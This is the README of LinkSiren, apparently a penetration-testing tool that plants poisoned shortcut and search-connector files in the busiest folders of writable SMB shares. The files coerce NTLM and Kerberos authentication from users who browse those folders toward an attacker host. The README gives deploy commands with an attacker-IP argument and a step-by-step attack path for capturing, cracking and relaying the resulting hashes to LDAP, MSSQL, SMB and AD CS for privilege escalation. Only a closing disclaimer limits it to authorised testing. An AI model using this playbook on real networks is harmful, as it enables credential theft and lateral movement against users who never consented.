# LinkSiren

[![Latest Version](https://img.shields.io/pypi/v/LinkSiren.svg)](https://pypi.python.org/pypi/LinkSiren/)
[![Python Versions](https://img.shields.io/badge/python-3.9%2B%20%7C%20PyPy-blue.svg)](https://pypi.org/project/linksiren/)
[![GitHub License](https://img.shields.io/github/license/gjhami/LinkSiren)](https://github.com/gjhami/LinkSiren/blob/main/LICENSE)

_The Siren waits thee, singing song for song._ - Walter Savage Landor

LinkSiren is your new favorite method for escalation when you're stuck as a non-privileged user with lots of access to file shares. LinkSiren distributes .library-ms, .searchConnector-ms, .url, and .lnk files to optimal locations in accessible file shares to coerce NetNTLM and Kerberos authentication over SMB and HTTP from users that open them and starting the Webclient service on their machines. It's like [Farmer](https://github.com/mdsecactivebreach/Farmer/tree/1f37598125a92c9edf41295c6c1b7c258143968d), [Lnkbomb](https://github.com/dievus/lnkbomb), or [Slinky](https://www.infosecmatter.com/crackmapexec-module-library/?cmem=smb-slinky) but it identifies the best place to put the files for maximum coercion and has scalable deployment and cleanup built in.

# Installation
Using pipx (Recommended)
```
# Install linksiren
pipx install linksiren
```

<details>
<summary>Alternatively, install from source</summary>

```
# Download source code
git clone https://github.com/gjhami/LinkSiren.git
cd LinkSiren

# Optional: Set up a virtual environment and install requirements
python -m venv .venv
source ./.venv/bin/activate # Linux
# .\.venv\Scripts\activate # Windows

# Install requirements
python -m pip install -r requirements.txt
```

</details>

# How do I use this NOW?
```bash
# Identify optimal locations for poisoned file deployment
linksiren identify --targets <shares file> [domain]/username[:password]

# Deploy to identified locations
linksiren deploy --attacker <attacker IP> [domain]/username[:password]

# Capture hashes / relay authentication / exploit the WebClient service

# Cleanup poisoned files
linksiren cleanup [domain]/username[:password]
```

# How do I use this the \~right\~ way?
1. Create a targets file for crawling containing accessible hosts, shares, or folders on each line in the following format. If a host is specified, shares will be identified on the host and treated as the next level of depth for crawling:
```
\\server1.domain.tld\
\\server2.domain.tld\share1
\\server3.domain.tld\share2\folder1\subfolder1
```

2. Use LinkSiren to crawl the provided paths to the specified depth, searching for the ideal location to place a file that will coerce authentication. Resulting UNC paths are saved in `folder_targets.txt` in the current directory.
```bash
# Note: You may fine tune the --max-depth, --active-threshold, --fast, and --max-folders-per-share params as necessary.
# You may also fine tune --max-concurrency to improve performance.
# Note: Specify '.' as the domain to log in using a local user account
linksiren identify --targets targets.txt [domain]/username[:password]
```

3. Use LinkSiren to deploy payloads to the locations identified in step 2. Optionally, specify a payload name and extension. The payload type (.searchConnector-ms, .library-ms, .lnk, or .url) will be selected automatically from the extension. Folders where payloads were successfully written are saved to `payloads_written.txt`. Use the hostname or DNS name of the attacker host and perform poisoning as necessary to get intranet zoned, as described in my [blog post](https://alittleinsecure.com/dns-hijacking-say-my-name/) and [theHackerRecipes](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/webclient#abuse), to coerce HTTP authentication.
```bash
linksiren deploy --attacker <attacker IP> [domain]/username[:password]
```

4. Let the hashes come to you and relay them as you see fit :)
    - Use [LdapRelayScan](https://github.com/zyn3rgy/LdapRelayScan) or [NetExec's ldap-checker](https://www.netexec.wiki/ldap-protocol/check-ldap-signing) to identify LDAP services vulnerable to relay.
    - Use [mssqlrelay](https://github.com/CompassSecurity/mssqlrelay) to identify MSSQL services that do not enforce encryption and are therefore vulnerable to relay. Also, consider combining this with information about Microsoft Configuration Manager to perform [TAKEOVER-1](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/TAKEOVER/TAKEOVER-1/takeover-1_description.md).
    - Use [NetExec's SMB functionaltiy](https://www.netexec.wiki/smb-protocol/enumeration/smb-signing-not-required) to identify SMB services vulnerable to relay.
    - Use this [one-liner](https://x.com/Defte_/status/1795815420903002495) to check for ADCS ESC8 without authentication, or use NetExec/Certipy/Certify with authentication to identify ESC8 and other escalation paths as [described by TheHackerRecipes](https://www.thehacker.recipes/ad/movement/adcs/#recon) that may also be viable relay targets.
    - Use NTLMRelayx from [Impacket](https://github.com/fortra/impacket) to relay to identified targets with pcredz for hash capture on the attacker machine. I highly recommend `-socks` mode with NTLMRelayx.
    - [Krbjack](https://github.com/almandin/krbjack) or [Krbrelayx](https://github.com/dirkjanm/krbrelayx) could be used to relay Kerberos authentication to a machine if you can create a DNS record thanks to the a technique published by James Foreshaw and described in a [blog post](https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx) from Synacktiv. Domain users may create new DNS records by default and creating new DNS records is often possible without authentication thanks to [DDSpoof](https://github.com/akamai/DDSpoof). Note that the target service for the relay attack must map to the same service class as the relayed authentication and the service must not implement signing, channel binding, or extended protection for authentication.

5. Cleanup the payload files when the attack is finished. LinkSiren will output messages about any previously written payloads that it isn't able to successfully delete.
```bash
linksiren cleanup [domain]/username[:password]
```

6. Scan for the WebClient service, now likely started on several machines, see [theHackerRecipes](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/webclient#recon) for details. See this BHIS presentation [Attack Tactics: Shadow Creds for Privesc](https://www.linkedin.com/posts/black-hills-information-security_attack-tactic-shadow-creds-activity-7284615209929891840-Po8m) for how HTTP authentication coerced from the service can be used privesc and lateral movement. Additionally see my blog post [Files that Coerce](https://alittleinsecure.com/files-that-coerce-search-connectors-and-beyond/) for details of how a machine, once taken over using shadow credentials, can be used to coerce authentication from logged in users.

# What is the Attack Path Associated With This Tool?
1. (Optional) Get Intranet-Zoned if you want to coerce HTTP authentication. See the note in [theHackerRecipes WebClient Abuse](https://www.thehacker.recipes/a-d/movement/mitm-and-coerced-authentications/webclient#abuse) and my blog post [DNS Hijacking: Say My Name](https://alittleinsecure.com/dns-hijacking-say-my-name/).
2. Create a list of UNC paths to writeable SMB shares.
    - Note: Consider write and delete privileges are distinct on Windows. It is possible you can create a poisoned file but will not have permissions to delete it. If this happens, LinkSiren will be very verbose in letting you know.
3. [Optional] Run LinkSiren in `generate` mode to write templates locally
4. [Optional] Run LinkSiren in `rank` mode to output rankings for accessible folders based on recent access.
5. Run LinkSiren in `identify` mode to find the best places to put poisoned files.
6. Start a listener or relay on your attacker machine to capture and/or relay coerced authentication to services without Signing/Channel Binding like LDAP, MSSQL, SMB, AD CS (HTTP), and others.
7. Run LinkSiren in `deploy` mode to place payloads in the optimal locations identified.
8. Let the hashes roll in. Relay and/or crack as desired.
9. Run LinkSiren in `cleanup` mode to delete all the poisoned files.

# Modes
LinkSiren offers the following modes of operation:

## Generate
Create poisoned files to use for coercion and store them locally.

<details>
<summary>Usage</summary>

```
linksiren generate --help
usage: linksiren generate [-h] -a ATTACKER [-n PAYLOAD]

options:
  -h, --help            show this help message and exit
  -n PAYLOAD, --payload PAYLOAD
                        (Default: @Test_Do_Not_Remove.searchConnector-ms) Name of payload file ending in .library-ms, .searchConnector-ms, .lnk, or .url

Required Arguments:
  -a ATTACKER, --attacker ATTACKER
                        Attacker IP or hostname to place in malicious URL
```
</details>

## Rank
Given a list of accessible shares, output ranks for the folders within them based on the liklihood placing a file in the folder will coerce authentication from a user.

<details>
<summary>Usage</summary>

```
linksiren rank --help
usage: linksiren rank [-h] -t TARGETS [-md MAX_DEPTH] [-at ACTIVE_THRESHOLD] [-f] [-is IGNORE_SHARES [IGNORE_SHARES ...]] [-mc MAX_CONCURRENCY] credentials

options:
  -h, --help            show this help message and exit
  -md MAX_DEPTH, --max-depth MAX_DEPTH
                        (Default: 3) The maximum depth of folders to search within the target.
  -at ACTIVE_THRESHOLD, --active-threshold ACTIVE_THRESHOLD
                        (Default: 2) Number of days as an integer for active files.
  -f, --fast            (Default: False) Mark folders active as soon as one active file in them is identified and move on. Ranks are all set to 1 assigned.
  -is IGNORE_SHARES [IGNORE_SHARES ...], --ignore-shares IGNORE_SHARES [IGNORE_SHARES ...]
                        (Default: 'C$' 'ADMIN$' 'SYSVOL') Do not review the contents of specified shares when crawling as part of the folder ranking process.
  -mc MAX_CONCURRENCY, --max-concurrency MAX_CONCURRENCY
                        (Default: 4) Max number of concurrent processes to use for crawling in rank and identification modes. Note: a maximum of 1 process is used per host.
                        So linksiren will never make multiple simultaneous connections to the same host and concurrent processing will not accelerate crawling multiple
                        shares on a single host.

Required Arguments:
  credentials           [domain/]username[:password] for authentication
  -t TARGETS, --targets TARGETS
                        Path to a text file containing UNC paths to file shares / base directories within which to rank folders as potential locations for placing poisoned
                        files.
```
</details>

## Identify
Given a list of accessible shares and customizable constraints, including a maximum number of target folders per share, output UNC paths to the optimal folders for placing poisoned files.

<details>
<summary>Usage</summary>

```
linksiren identify --help
usage: linksiren identify [-h] -t TARGETS [-md MAX_DEPTH] [-at ACTIVE_THRESHOLD] [-f] [-is IGNORE_SHARES [IGNORE_SHARES ...]] [-mf MAX_FOLDERS_PER_TARGET]
                          [-mc MAX_CONCURRENCY]
                          credentials

options:
  -h, --help            show this help message and exit
  -md MAX_DEPTH, --max-depth MAX_DEPTH
                        (Default: 3) The maximum depth of folders to search within the target
  -at ACTIVE_THRESHOLD, --active-threshold ACTIVE_THRESHOLD
                        (Default: 2) Max number of days since within which a file is considered active.
  -f, --fast            (Default: False) Mark folders active as soon as one active file in them is identified and move on. Ranks are all set to 1.
  -is IGNORE_SHARES [IGNORE_SHARES ...], --ignore-shares IGNORE_SHARES [IGNORE_SHARES ...]
                        (Default: 'C$' 'ADMIN$' 'SYSVOL') Do not review the contents of specified shares when crawling as part of the folder ranking and optimal poisoning
                        folder identification process.
  -mf MAX_FOLDERS_PER_TARGET, --max-folders-per-target MAX_FOLDERS_PER_TARGET
                        (Default: 10) Maximum number of folders to output as deployment targets per supplied target share or folder.
  -mc MAX_CONCURRENCY, --max-concurrency MAX_CONCURRENCY
                        (Default: 4) Max number of concurrent processes to use for crawling in rank and identification modes. Note: a maximum of 1 process is used per host.
                        So linksiren will never make multiple simultaneous connections to the same host and concurrent processing will not accelerate crawling multiple
                        shares on a single host.

Required Arguments:
  credentials           [domain/]username[:password] for authentication
  -t TARGETS, --targets TARGETS
                        Path to a text file containing UNC paths to file shares / base directories to crawl for optimal locations to write poisoned files.
```

</details>

## Deploy
Generate poisoned files for coercion and deploy them to specified UNC paths. Typically the specified UNC paths are the output of `identify` mode. Output a list of UNC paths to folders where payloads were successfully deployed for cleanup.

<details>
<summary>Usage</summary>

```
linksiren deploy --help
usage: linksiren deploy [-h] -a ATTACKER [-t TARGETS] [-n PAYLOAD] credentials

options:
  -h, --help            show this help message and exit
  -t TARGETS, --targets TARGETS
                        (Default: 'payload_targets.txt') Path to a text file containing UNC paths to folders into which poisoned files will be deployed.
  -n PAYLOAD, --payload PAYLOAD
                        (Default: @Test_Do_Not_Remove.searchConnector-ms) Name of payload file ending in .library-ms, .searchConnector-ms, .lnk, or .url

Required Arguments:
  credentials           [domain/]username[:password] for authentication
  -a ATTACKER, --attacker ATTACKER
                        Attacker IP or hostname to place in poisoned files.
```
</details>

## Cleanup
Remove all payloads from the specified UNC paths, typically the output of `deploy` mode.

<details>
<summary>Usage</summary>

```
linksiren cleanup --help
usage: linksiren cleanup [-h] [-t TARGETS] credentials

options:
  -h, --help            show this help message and exit
  -t TARGETS, --targets TARGETS
                        (Default: 'payloads_written.txt') Path to a text file containing UNC paths poisoned files to clean up.

Required Arguments:
  credentials           [domain/]username[:password] for authentication
```

</details>

## What Payload Type Should I Use?
Search Connectors (.searchConnector-ms): This is generally the best option. They require the least amount of interaction, start the WebClient service from a stopped state automatically when the parent folder is opened in Explorer, and are capable of coercing both SMB and HTTP authentication using a single file.

## How is this better than the other tools?
Summary
- Scales to an arbitrary number of malicious .searchConnector-ms, .library-ms, .url, or .lnk files
- Targeted malicious file placement
- Single command deployment and cleanup
- Cross platform with python

As in real estate, consider the three most important things when attempting to coerce auth using files: location, location, location. All techniques identified here only coerce authentication from users that open the folder containing the poisoned file.

Other tools are built to place a single malicious .searchConnector-ms, .library-ms, or .url file at a specified location and clean up that one malicious file. If you find yourself with access to a lot of shares, then you may want things to scale and you may not be in the mood to write a wrapper. Additionally, you may not know the best place to put a poisoned file in a sea of accessible shares.

LinkSiren crawls accessible shares and ranks every subfolder based on the liklihood it will be opened by a user sometime soon. Then it uses this information to target malicious file distribution to multiple locations at once. Additionally, LinkSiren records the full UNC path of malicious files it creates, allowing for cleanup with a single command.

## How will you make it even better?
I'm looking to add the following features:
- [ ] Repackage for use with UV.
- [ ] Add a safe mode that checks if a file can be deleted from a target share before deploying it.
- [ ] Add an option for 'invisible' targets for .Library-ms and .searchConnector-ms files where the icon is set to blank and the name is set to a non-printing, valid ASCII character.
- [ ] Test for anonymous access to shares
- [ ] Add an explanation of how this can be used with ntlmrelayx (Blog Post In Progress)
- [ ] Enable authentication using a NTLM hash
- [ ] Enable ticket based authnentication (Kerberos)
- [ ] Add pydantic validation for arguments including targets and output file names.
- [ ] Add compatibility with proxied SMB relay connections created using impacket's ntlmrelayx.
    - The attack would need to be added to [smbattack.py](https://github.com/fortra/impacket/blob/4a62f391cf2c5e60577e0138b01df4fec735d5ed/impacket/examples/ntlmrelayx/attacks/smbattack.py#L57) and would need to accept only an authenticated SMB connection.

## Note
This tools is designed for ethical hacking and penetration testing. It should be used exclusively on networks where explicit, written permission has been granted for testing. I accept no responsibility for the safety or effectiveness of this tool. Please don't sue me.
